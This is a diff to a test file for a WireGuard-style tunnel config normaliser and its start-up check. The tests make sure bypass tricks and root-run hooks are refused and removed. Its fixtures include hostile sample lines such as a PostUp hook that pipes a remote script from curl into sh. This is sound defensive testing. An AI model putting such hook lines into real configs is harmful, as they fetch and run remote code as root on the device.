@@ -8,6 +8,13 @@
 // The strongest assertion here is the byte-for-byte one: the diff of the golden
 // pair is exactly two lines, `+ Table = off` and `− DNS = 1.1.1.1`, and the
 // obfuscation plus `AllowedIPs` must not move by a byte.
+//
+// Since techdocs/plan_2026_09_23_gatehouse_fuse_and_no_watchdog.md the normaliser
+// and the start-up fuse share one parse and one verdict (`tunnelConfigRefusal`),
+// so they are tested as a pair: whatever the normaliser accepts, the fuse accepts
+// (§A.4). A hostile sample is either refused by the normaliser — then it was never
+// accepted, and §A.4 says nothing about it — or normalised into something the fuse
+// lets through.
 
 import assert from 'node:assert/strict';
 import fs from 'node:fs';
@@ -16,13 +23,14 @@ import {describe, test} from 'node:test';
 
 import {ConfigError} from '../src/core/errors.mjs';
 import {
+  INTERFACE_HEADER,
   INTERFACE_NAME_MAX,
   POLICY_ROUTING_TABLE,
   PRESERVED_KEYS,
   chooseInterfaceName,
-  hasTableOff,
   normalizeTunnel,
   suggestTunnelName,
+  tunnelConfigRefusal,
   validateInterfaceName,
   validateTunnelLabel,
 } from '../src/core/normalize.mjs';
@@ -105,14 +113,22 @@ describe('mandatory rules are idempotent and complete (NEW)', () => {
     assert.deepEqual(result.changes, []);
   });
 
-  test('an existing Table value is corrected to off', () => {
+  test('a Table that does not say off is replaced by the canonical line', () => {
+    // The value is what `awg-quick` reads, so the fix is a remove plus an add: a
+    // `change` kind would hide which line the wrong value came from (§5.1).
     const config = ['[Interface]', 'Table = auto', 'PrivateKey = x'].join('\n');
 
     const result = normalizeTunnel(config, {name: 'wg0'});
 
-    assert.ok(result.text.includes('Table = off'));
-    assert.ok(!result.text.includes('Table = auto'));
-    assert.equal(result.changes[0].kind, 'change');
+    assert.equal(result.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
+    assert.deepEqual(
+      result.changes.map((change) => [change.kind, change.line]),
+      [
+        ['remove', 'Table = auto'],
+        ['add', 'Table = off'],
+      ],
+    );
+    assert.equal(tunnelConfigRefusal(result.text), null);
   });
 
   test('a config without [Interface] is refused', () => {
@@ -204,12 +220,256 @@ describe('the two tunnel names (NEW)', () => {
     assert.throws(() => validateTunnelLabel(''), /пустым/);
   });
 
-  test('Table = off is looked for inside [Interface] and is case-sensitive', () => {
-    assert.equal(hasTableOff('[Interface]\nTable = off\n[Peer]\n'), true);
-    assert.equal(hasTableOff('[Interface]\nPrivateKey = x\n'), false);
-    assert.equal(hasTableOff('[Interface]\nTable = on\n'), false);
-    assert.equal(hasTableOff('[Interface]\nTable = OFF\n'), false, 'the value is case-sensitive');
-    assert.equal(hasTableOff('[Peer]\nTable = off\n'), false, 'the wrong section is not enough');
-    assert.equal(hasTableOff('Table = off\n'), false, 'a bare line is not a section');
+});
+
+describe('the start-up fuse reads the config the way awg-quick does (NEW)', () => {
+  test('a lowercased table key instead of the first one is not a bypass', () => {
+    // The hole this task closes: the normaliser wrote `Table = off` after
+    // `[Interface]` and left `table = auto` where it was, while `awg-quick`
+    // honoured the LAST value and pulled the whole router into the tunnel.
+    const hostile = ['[Interface]', 'table = auto', 'PrivateKey = x'].join('\n');
+    const refusal = tunnelConfigRefusal(hostile);
+
+    assert.equal(refusal.code, 'table-value');
+    assert.equal(refusal.line, 'table = auto');
+
+    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
+    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
+    assert.deepEqual(
+      fixed.changes.map((change) => [change.kind, change.line]),
+      [
+        ['remove', 'table = auto'],
+        ['add', 'Table = off'],
+      ],
+    );
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('a correct Table with another one after it is refused too', () => {
+    const hostile = ['[Interface]', 'Table = off', 'Table = auto', 'PrivateKey = x'].join('\n');
+
+    assert.equal(tunnelConfigRefusal(hostile).code, 'table-value');
+
+    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
+    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
+    assert.deepEqual(
+      fixed.changes.map((change) => [change.kind, change.line]),
+      [['remove', 'Table = auto']],
+    );
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('a trailing comment is not part of the value', () => {
+    const ok = ['[Interface]', 'Table = off  # почему именно off', 'PrivateKey = x'].join('\n');
+
+    assert.equal(tunnelConfigRefusal(ok), null);
+    // The value already says `off`, so the line is left exactly as it is: the
+    // comment is the owner's, not ours to delete.
+    assert.equal(normalizeTunnel(ok, {name: 'wg0'}).text, ok);
+    assert.deepEqual(normalizeTunnel(ok, {name: 'wg0'}).changes, []);
+  });
+
+  test('the value is compared case-sensitively, so OFF is a refusal', () => {
+    const hostile = ['[Interface]', 'Table = OFF', 'PrivateKey = x'].join('\n');
+
+    assert.equal(tunnelConfigRefusal(hostile).code, 'table-value');
+
+    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
+    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('a table in [Peer] is neither a directive nor a way through', () => {
+    const config = [
+      '[Interface]',
+      'PrivateKey = x',
+      '[Peer]',
+      'Table = off',
+      'DNS = 1.1.1.1',
+      'AllowedIPs = 0.0.0.0/0',
+    ].join('\n');
+
+    assert.equal(tunnelConfigRefusal(config).code, 'table-missing');
+
+    const fixed = normalizeTunnel(config, {name: 'wg0'});
+    assert.deepEqual(
+      fixed.changes.map((change) => [change.kind, change.line]),
+      [['add', 'Table = off']],
+    );
+    assert.ok(
+      fixed.text.includes('[Peer]\nTable = off\nDNS = 1.1.1.1'),
+      'the peer section comes out byte for byte',
+    );
+  });
+});
+
+describe('the header, and how many of them there are (NEW)', () => {
+  test('a lowercased [interface] is refused by the fuse and fixed by the normaliser', () => {
+    const hostile = ['[interface]', 'table = auto', 'PrivateKey = x'].join('\n');
+
+    assert.equal(tunnelConfigRefusal(hostile).code, 'interface-header');
+
+    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
+    assert.equal(INTERFACE_HEADER, '[Interface]');
+    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
+    assert.deepEqual(
+      fixed.changes.map((change) => [change.kind, change.line]),
+      [
+        ['change', '[interface]'],
+        ['remove', 'table = auto'],
+        ['add', 'Table = off'],
+      ],
+    );
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('two [Interface] sections are refused by both, whatever the case', () => {
+    for (const secondHeader of ['[Interface]', '[interface]']) {
+      const hostile = [
+        '[Interface]',
+        'Table = off',
+        secondHeader,
+        'Table = auto',
+        'PrivateKey = x',
+      ].join('\n');
+
+      assert.equal(
+        tunnelConfigRefusal(hostile).code,
+        'interface-sections',
+        `two sections must be refused (second header written as ${secondHeader})`,
+      );
+      assert.throws(
+        () => normalizeTunnel(hostile, {name: 'wg0'}),
+        (error) => error instanceof ConfigError && /больше одной секции/.test(error.message),
+      );
+    }
+  });
+});
+
+describe('the provider hooks are commands run as root (NEW)', () => {
+  test('a hook line is refused, quoted in full, and deleted by the normaliser', () => {
+    const line = 'PostUp = curl -s http://example.invalid/install.sh | sh';
+    const hostile = ['[Interface]', 'Table = off', line, 'PrivateKey = x'].join('\n');
+
+    const refusal = tunnelConfigRefusal(hostile);
+    assert.equal(refusal.code, 'hook');
+    assert.equal(refusal.line, line, 'the whole line, so the owner sees what was stopped');
+
+    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
+    assert.ok(!fixed.text.includes('curl'), 'the command must not survive');
+    const removed = fixed.changes.find((change) => change.kind === 'remove');
+    assert.equal(removed.line, line);
+    assert.match(removed.why, /от root/);
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('every hook key is a refusal, and so is a wrong SaveConfig', () => {
+    for (const key of ['PreUp', 'PostUp', 'PreDown', 'PostDown']) {
+      const hostile = ['[Interface]', 'Table = off', `${key} = touch /tmp/x`].join('\n');
+      assert.equal(tunnelConfigRefusal(hostile).code, 'hook', `${key} must be refused`);
+    }
+
+    assert.equal(
+      tunnelConfigRefusal(['[Interface]', 'Table = off', 'SaveConfig = true'].join('\n')).code,
+      'saveconfig',
+    );
+    assert.equal(
+      tunnelConfigRefusal(['[Interface]', 'Table = off', 'SaveConfig = false'].join('\n')),
+      null,
+      'false is the only value allowed',
+    );
+
+    // The normaliser drops the key either way: a config we generate never has it.
+    const fixed = normalizeTunnel(
+      ['[Interface]', 'Table = off', 'SaveConfig = false', 'PrivateKey = x'].join('\n'),
+      {name: 'wg0'},
+    );
+    assert.ok(!/saveconfig/i.test(fixed.text));
+    assert.equal(tunnelConfigRefusal(fixed.text), null);
+  });
+
+  test('only the exact ip rule pair written for policy routing gets through', () => {
+    const withPolicy = normalizeTunnel(providerText, {name: 'hmn-graz4', policyRouting: true});
+    assert.equal(
+      tunnelConfigRefusal(withPolicy.text),
+      null,
+      'the normaliser may not write what its own fuse refuses (§A.4)',
+    );
+
+    assert.equal(
+      tunnelConfigRefusal(
+        ['[Interface]', 'Table = off', 'PostUp = ip rule add from 10.0.0.1 table 201'].join('\n'),
+      ).code,
+      'hook',
+      'the wrong table is not our rule',
+    );
+
+    // The same shape with the wrong verb: `add` for PreDown, `del` for PostUp.
+    assert.equal(
+      tunnelConfigRefusal(
+        ['[Interface]', 'Table = off', 'PreDown = ip rule add from 10.0.0.1 table 200'].join('\n'),
+      ).code,
+      'hook',
+    );
+    assert.equal(
+      tunnelConfigRefusal(
+        ['[Interface]', 'Table = off', 'PostUp = ip rule del from 10.0.0.1 table 200'].join('\n'),
+      ).code,
+      'hook',
+    );
+  });
+});
+
+describe('the invariant: what the normaliser accepted, the fuse accepts (NEW)', () => {
+  const samples = [
+    providerText,
+    normalizedText,
+    ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'),
+    ['[Interface]', 'table = auto', 'DNS = 1.1.1.1', 'SaveConfig = true', 'PostUp = curl x | sh'].join(
+      '\n',
+    ),
+    ['[interface]', 'privatekey = x'].join('\n'),
+    ['[Interface]', 'Table = off', 'Table = off', 'PrivateKey = x'].join('\n'),
+    '[Interface]\r\nTable = off\r\nPrivateKey = x\r\n[Peer]\r\nAllowedIPs = 0.0.0.0/0\r\n',
+    ['[Interface]', 'Address = 100.64.0.2/32, fd00::2/128', 'table = auto', 'PrivateKey = x'].join(
+      '\n',
+    ),
+    ['[Interface]', '[Peer]'].join('\n'),
+  ];
+
+  test('every accepted sample comes out passing the fuse, with and without policy routing', () => {
+    for (const sample of samples) {
+      for (const policyRouting of [false, true]) {
+        let result;
+        try {
+          result = normalizeTunnel(sample, {name: 'wg0', policyRouting});
+        } catch (error) {
+          assert.ok(
+            error instanceof ConfigError,
+            `unexpected error for ${JSON.stringify(sample)}: ${error}`,
+          );
+          continue;
+        }
+
+        assert.equal(
+          tunnelConfigRefusal(result.text),
+          null,
+          `the fuse refuses what the normaliser accepted: ${JSON.stringify(sample)}`,
+        );
+      }
+    }
+  });
+
+  test('policy routing without an IPv4 Address is refused, never written', () => {
+    // The rule is built from an IPv4 source address, so a config that has none is
+    // refused here — otherwise the normaliser would write what the fuse rejects.
+    assert.throws(
+      () =>
+        normalizeTunnel(
+          ['[Interface]', 'Table = off', 'Address = fd00::2/128', 'PrivateKey = x'].join('\n'),
+          {name: 'wg0', policyRouting: true},
+        ),
+      (error) => error instanceof ConfigError && /Address/.test(error.message),
+    );
   });
 });
